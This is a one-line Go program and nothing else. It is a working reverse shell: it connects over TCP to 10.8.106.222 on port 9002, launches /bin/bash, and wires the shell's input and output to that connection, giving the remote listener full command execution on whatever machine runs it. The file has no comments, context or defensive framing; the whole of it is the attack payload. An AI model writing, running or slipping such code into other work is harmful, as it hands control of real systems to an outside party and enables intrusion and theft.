package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.8.106.222:9002");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
